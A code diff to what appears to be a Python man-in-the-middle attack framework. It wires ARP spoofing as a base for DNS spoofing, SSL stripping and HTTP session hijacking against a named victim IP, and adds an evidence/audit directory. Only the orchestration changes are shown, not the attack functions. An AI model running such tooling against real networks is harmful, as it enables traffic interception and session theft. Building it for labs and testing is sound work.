@@ -46,6 +46,8 @@ def run(mode: str):
     config = load_config()
     running_threads = {}
 
+    audit_dir = os.getcwd()
+
     print("[INFO] Loaded topology config.")
     print(f"[INFO] Mode requested: {mode!r}")
 
@@ -65,11 +67,26 @@ def run(mode: str):
         print(f"       gateway  : {gateway_ip}")
         print(f"       attacker : {attacker_ip} ({attacker_iface})")
         print(f"       domain   : {domain_name}")
+        print(f"[INFO] Evidence/Audit directory: {audit_dir}")
 
         # ARP Spoofing required for all attacks
         if any(x in mode for x in ["arp", "dns", "ssl", "session"]):
+            dependents = []
+            if "dns" in mode:
+                dependents.append("dns_spoofing")
+            if "ssl" in mode:
+                dependents.append("ssl_stripping")
+            if "session" in mode:
+                dependents.append("http_session_hijacking")
+
             print("[INFO] Starting ARP spoofing (MITM foundation)...")
-            arp_spoofer = start_arp_spoof(victim_ip, gateway_ip, attacker_iface)
+            arp_spoofer = start_arp_spoof(
+                victim_ip,
+                gateway_ip,
+                attacker_iface,
+                audit_dir=audit_dir,
+                dependents=dependents,
+            )
             if not arp_spoofer:
                 raise RuntimeError("ARP Spoofer failed to start.")
             running_threads["arp"] = arp_spoofer
